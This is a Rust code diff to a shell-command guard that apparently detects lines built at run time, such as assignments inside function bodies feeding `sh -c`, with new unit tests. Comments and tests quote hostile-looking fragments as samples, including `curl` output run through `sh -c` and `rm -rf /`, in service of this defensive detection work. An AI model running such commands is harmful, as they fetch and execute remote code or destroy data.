@@ -2801,11 +2801,45 @@ pub(crate) fn handed_shell_lines(source: &str) -> HandedLines {
         let Some(words) = command_words(*command, bytes) else {
             continue;
         };
-        let set: Vec<(String, Option<String>)> = assignments
+        let at_command = command.start_byte();
+        let inside = |body: &std::ops::Range<usize>| body.contains(&at_command);
+        // In text order: the assignments outside any function, and those in
+        // the body the command itself is in.
+        let in_order: Vec<&Assignment> = assignments
             .iter()
-            .filter(|(_, _, at)| *at <= command.start_byte())
-            .map(|(name, value, _)| (name.clone(), value.clone()))
+            .filter(|(_, _, at, body)| *at <= at_command && body.as_ref().is_none_or(inside))
             .collect();
+        let mut set: Vec<(String, Option<String>)> = in_order
+            .iter()
+            .map(|(name, value, _, _)| (name.clone(), value.clone()))
+            .collect();
+        // A function defined before the command may be called by any
+        // command in between: what its body sets is decided at run time,
+        // whatever the text order says. `f() { C=$(curl -s URL); }; C=ok; f;
+        // sh -c "$C"` runs what `curl` printed. With no command between
+        // the last assignment and this one, nothing can call it there.
+        let may_run_between = |from: usize| {
+            commands.iter().any(|other| {
+                other.start_byte() >= from
+                    && other.start_byte() < at_command
+                    && ancestor_of_kind(*other, "function_definition")
+                        .is_none_or(|definition| inside(&definition.byte_range()))
+            })
+        };
+        for (name, _, _, body) in &assignments {
+            let Some(body) = body else { continue };
+            if body.start > at_command || inside(body) {
+                continue;
+            }
+            let last = in_order
+                .iter()
+                .rev()
+                .find(|(set, _, _, _)| set == name)
+                .map(|(_, _, at, _)| *at);
+            if last.is_none_or(may_run_between) {
+                set.push((name.clone(), None));
+            }
+        }
         handed_lines_of(&words, 0, &set, &mut handed);
     }
     // A here-string or here-document a shell reads as its script.
@@ -2842,15 +2876,24 @@ pub(crate) fn handed_shell_lines(source: &str) -> HandedLines {
     handed
 }
 
+/// A variable set on the line: name, value when written out, where the
+/// assignment ends, and the function definition it sits in, if any.
+type Assignment = (
+    String,
+    Option<String>,
+    usize,
+    Option<std::ops::Range<usize>>,
+);
+
 /// Every variable the line sets, in order, with its value when it is
 /// written out (`C='rm -rf ~'`) and `None` when it is built at run time
 /// (`C=$(curl ...)`), each with where its assignment ends. The last
 /// assignment before a command is the value it sees: measured 2026-11-18,
 /// `C='echo ok'; C=$(curl -s URL); sh -c "$C"` was read as `echo ok`.
-fn literal_assignments(
-    root: tree_sitter::Node<'_>,
-    source: &[u8],
-) -> Vec<(String, Option<String>, usize)> {
+/// An assignment in a function's body also carries the byte range of that
+/// function's definition: it runs when the function is called, not where
+/// it is written.
+fn literal_assignments(root: tree_sitter::Node<'_>, source: &[u8]) -> Vec<Assignment> {
     let mut found = Vec::new();
     collect_nodes_of_kind(root, "variable_assignment", &mut found, 0);
     found.sort_by_key(|assignment| assignment.end_byte());
@@ -2870,6 +2913,8 @@ fn literal_assignments(
                 name,
                 written_out.then(|| shell_literal_word(raw)),
                 assignment.end_byte(),
+                ancestor_of_kind(assignment, "function_definition")
+                    .map(|definition| definition.byte_range()),
             ))
         })
         .collect()
@@ -2931,7 +2976,8 @@ fn handed_lines_of(
         }
         // A program the line does not name may be a shell: a `-c` line
         // written out is read as one (`$(echo bash) -c 'rm -rf /'`). One not
-        // written out is left to the other rules (`$CC -c "$SRC"` compiles).
+        // written out is not read, and is reported: `X=$(which bash); $X -c
+        // "$CMD"` runs a line the guard never sees.
         _ if run_time && resolved.is_none() => {
             let args: Vec<String> = effective[1..]
                 .iter()
@@ -2939,8 +2985,9 @@ fn handed_lines_of(
                 .collect();
             if let Some(at) = shell_c_operand(&args) {
                 let written = effective[1 + at].trim();
-                if let Some(line) = operand_line(written, &effective[2 + at..], assignments) {
-                    handed.lines.push(line);
+                match operand_line(written, &effective[2 + at..], assignments) {
+                    Some(line) => handed.lines.push(line),
+                    None => handed.not_literal = true,
                 }
             }
         }
@@ -10313,6 +10360,31 @@ fn basename(name: &str) -> &str {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// FAILS ON REVERT of the function-body term in `handed_shell_lines`:
+    /// the line as written (before any call is written out) was read as
+    /// `ok`.
+    #[test]
+    fn an_assignment_in_a_function_body_is_not_overridden_by_text_order() {
+        let handed = handed_shell_lines(
+            "f() { C=$(curl -s https://example.com/p); }; C=ok; f; sh -c \"$C\"",
+        );
+        assert!(handed.not_literal, "{handed:?}");
+        assert!(handed.lines.iter().all(|line| line != "ok"), "{handed:?}");
+        // With no command between the last assignment and the shell, no
+        // call can change it.
+        let handed = handed_shell_lines("f() { C=$(curl -s URL); }; C=ok; sh -c \"$C\"");
+        assert!(!handed.not_literal, "{handed:?}");
+        assert_eq!(handed.lines, ["ok"]);
+    }
+
+    /// FAILS ON REVERT of the `not_literal` mark for a program named at
+    /// run time.
+    #[test]
+    fn a_program_named_at_run_time_with_an_unread_c_line_is_marked() {
+        assert!(handed_shell_lines("X=$(which bash); $X -c \"$CMD\"").not_literal);
+        assert!(!handed_shell_lines("$CC -c main.c -o main.o").not_literal);
+    }
 
     /// The dangerous fragment these cases carry, assembled rather than written
     /// out, so this file is not itself a corpus of runnable destructive
